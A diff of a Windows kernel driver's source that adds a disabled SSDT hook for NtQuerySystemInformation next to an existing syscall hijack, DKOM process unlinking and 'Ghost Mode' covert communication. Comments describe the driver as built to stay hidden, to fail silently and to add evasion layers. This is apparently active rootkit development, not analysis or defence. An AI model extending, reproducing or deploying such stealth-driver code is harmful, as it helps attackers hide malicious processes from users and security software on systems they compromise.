@@ -41,20 +41,31 @@ extern "C" NTSTATUS DriverEntry(
             return STATUS_SUCCESS;
         }
 
-        // Phase 2: Install syscall hijack for Ghost Mode communication
+        // Phase 2: Install SSDT hook for NtQuerySystemInformation
+        // NOTE: KeServiceDescriptorTable is not exported on x64 Windows
+        // This would require pattern scanning to find SSDT
+        // For now, we rely on DKOM (process unlinking) only
+        /*
+        NTSTATUS status = InstallNtQuerySystemInformationHook();
+        if (!NT_SUCCESS(status)) {
+            // Continue even if SSDT hook fails - not critical
+        }
+        */
+
+        // Phase 3: Install syscall hijack for Ghost Mode communication
         NTSTATUS status = InstallSyscallHijack();
         if (!NT_SUCCESS(status)) {
             // Silent failure - driver remains hidden
             return STATUS_SUCCESS;
         }
 
-        // Phase 3: Initialize legacy communication bridge (fallback)
+        // Phase 4: Initialize legacy communication bridge (fallback)
         status = SataProtocolStart();
         if (!NT_SUCCESS(status)) {
             // Continue even if legacy fails - Ghost Mode is primary
         }
 
-        // Phase 4: Additional stealth hardening (optional)
+        // Phase 5: Additional stealth hardening (optional)
         // In production, this would add more evasion layers
 
         // Return success only if stealth initialization succeeds
@@ -74,6 +85,9 @@ extern "C" VOID DriverUnload(PDRIVER_OBJECT DriverObject)
     UNREFERENCED_PARAMETER(DriverObject);
 
     __try {
+        // Remove SSDT hook (disabled on x64)
+        // RemoveNtQuerySystemInformationHook();
+        
         // Remove syscall hijack
         RemoveSyscallHijack();
 
